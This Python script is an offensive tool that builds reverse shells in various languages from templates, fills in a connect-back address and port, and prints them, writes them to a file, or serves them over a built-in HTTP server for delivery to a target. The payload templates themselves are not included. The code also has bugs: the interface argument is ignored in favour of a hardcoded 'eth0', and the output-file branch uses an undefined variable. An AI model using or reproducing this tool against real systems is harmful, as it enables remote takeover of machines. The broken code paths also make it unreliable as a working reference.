import argparse
import shells
import http.server
import socketserver
try:
    import netifaces as ni
    ifacesEnabled = True
except:
    print('Package netifaces not found, cannot use interface for IP retrieval')

class ShellHandler(http.server.BaseHTTPRequestHandler):
    
    def do_GET(self):        
        print(self.server)
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(shellContents.encode())

def printShells(help=''):
    print('Available shells:')
    for shell in shells.shells:
        print(shell['name'])

def get_ip_address(ifname):
    return ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']

parser = argparse.ArgumentParser(description='A script to generate reverse shells on various languages and serve them on http-server.')
parser.add_argument('-l', dest='shell', help='Language to identify the shell to be built. Use -s to see available shells.')
parser.add_argument('-a', dest='localAddr', help='Address to connect back to')
parser.add_argument('-p', dest='localPort', help='Port to connect back to', default=4444)
parser.add_argument('-o', dest='outfile', help='File to write the reverse shell to')
parser.add_argument('-s', dest='printShells', action='store_true', help='Print available shells')
parser.add_argument('-i', dest="interface", help="Interface name to get ip for reverse shell script")
parser.add_argument('--httpserver', dest='httpServer', action='store_true', default=False, help='Server the reverse-shell file on a http server')
parser.add_argument('--httpport', dest='httpPort', help='Port to start HTTP server in, default 80', default=80)

args = parser.parse_args()

if args.printShells:
    printShells()
    exit()

results = list(filter(lambda shell: shell['name'] == args.shell, shells.shells))

if len(results) > 0:
    selectedShell = results[0]
else:
    print('ERROR: Unregognized shell type\n')
    printShells()
    parser.print_help()
    exit()

if args.localAddr and args.interface:
    print('Only define local address or interface, not both!')
    parser.print_help()
    exit()

if (not args.localAddr and not args.interface and (selectedShell['address'])):
    print('Must specify IP or inteface!')
    parser.print_help()
    exit()

if args.interface and ifacesEnabled:
    localAddr = get_ip_address(args.interface)
else:
    localAddr = args.localAddr



shellFile = open('shells/'+selectedShell['file'], 'r')
shellContents = shellFile.read()
shellContents = shellContents.replace('[LIP]', localAddr).replace('[LP]', args.localPort)

if args.outfile:
    outfile = open(outfile, 'w+')
    outfile.write(shellContents)
else:
    print (shellContents)
if args.httpServer:
    with socketserver.TCPServer(("", args.httpPort), ShellHandler) as httpd:
        httpd.serve_forever()

